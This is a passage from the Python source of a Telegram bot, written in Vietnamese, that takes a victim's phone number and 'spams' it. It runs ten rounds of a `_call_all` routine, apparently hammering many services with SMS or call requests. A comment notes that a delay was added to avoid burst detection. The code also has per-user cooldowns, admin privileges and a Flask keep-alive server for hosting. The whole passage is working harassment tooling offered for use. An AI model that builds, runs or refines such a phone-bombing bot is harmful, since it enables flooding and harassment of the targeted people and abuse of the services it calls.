        # ── FIX: thêm delay 2s giữa các round để tránh burst detect ──
        ROUNDS = 10
        ROUND_DELAY = 2  # giây
        loop = asyncio.get_event_loop()
        for i in range(ROUNDS):
            try:
                await status.edit_text(
                    f"📨 Đang spam `{phone}`\n"
                    f"▶ Lần {i+1}/{ROUNDS}",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            await loop.run_in_executor(None, partial(_call_all, phone))
            # delay giữa rounds (trừ round cuối)
            if i < ROUNDS - 1:
                await asyncio.sleep(ROUND_DELAY)

        if not adm:
            spam_count[user.id] = spam_count.get(user.id, 0) + 1

        await status.edit_text(
            f"✅ *Xong!* `{phone}`\n"
            f"📊 Đã spam *{ROUNDS} lần* thành công!",
            parse_mode="Markdown"
        )

        # Delay user thường (3 phút)
        if not adm and USER_DELAY_SEC > 0:
            for j in range(USER_DELAY_SEC, 0, -15):
                mins = j // 60
                secs = j % 60
                try:
                    await status.edit_text(
                        f"✅ *Hoàn tất!* `{phone}`\n"
                        f"⏳ Spam tiếp sau: *{mins}p {secs:02d}s*",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
                await asyncio.sleep(15)

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=menu_text(user, adm),
            reply_markup=main_menu(adm),
            parse_mode="Markdown"
        )
        context.user_data.pop("pending_phone", None)
        context.user_data.pop("state", None)
        return

    if data == "spam_cancel":
        context.user_data.pop("pending_phone", None)
        context.user_data.pop("state", None)
        await query.edit_message_text(
            menu_text(user, adm),
            reply_markup=main_menu(adm),
            parse_mode="Markdown"
        )
        return

# ─── TEXT HANDLER ──────────────────────────────────────────────────────────────
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    adm = is_admin(user.id)

    if context.user_data.get("state") != "waiting_phone":
        if is_group_chat(update) or adm:
            await update.message.reply_text(
                menu_text(user, adm),
                reply_markup=main_menu(adm),
                parse_mode="Markdown"
            )
        else:
            kb = [[InlineKeyboardButton("💬 Vào nhóm chat", url=GROUP_LINK2)]]
            await update.message.reply_text(
                f"🤖 Chào! Để dùng lệnh spam, vui lòng vào nhóm chat:\n\n👉 {GROUP_LINK2}",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )
        return

    phone = update.message.text.strip()
    clean = phone.lstrip("+").replace(" ", "")
    if not clean.isdigit() or len(clean) < 9 or len(clean) > 12:
        await update.message.reply_text(
            "❌ Số điện thoại không hợp lệ. Nhập lại:",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Huỷ", callback_data="menu_back")
            ]])
        )
        return

    context.user_data["pending_phone"] = phone
    context.user_data.pop("state", None)

    kb = [
        [
            InlineKeyboardButton("✅ Xác nhận spam", callback_data="spam_confirm"),
            InlineKeyboardButton("❌ Huỷ", callback_data="spam_cancel"),
        ]
    ]
    await update.message.reply_text(
        f"⚡ Xác nhận spam số:\n📱 `{phone}`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb)
    )

# ─── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start, filters=filters.ALL))
    app.add_handler(CommandHandler("help", help_cmd, filters=filters.ALL))
    app.add_handler(CommandHandler("addadmin", addadmin_cmd, filters=filters.ALL))
    app.add_handler(CommandHandler("tb", broadcast_cmd, filters=filters.ALL))
    app.add_handler(CallbackQueryHandler(menu_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    log.info("Bot started.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    from flask import Flask
    from threading import Thread

    _app = Flask('')

    @_app.route('/')
    def _home():
        return "alive"

    Thread(target=lambda: _app.run(host='0.0.0.0', port=8080), daemon=True).start()
    main()
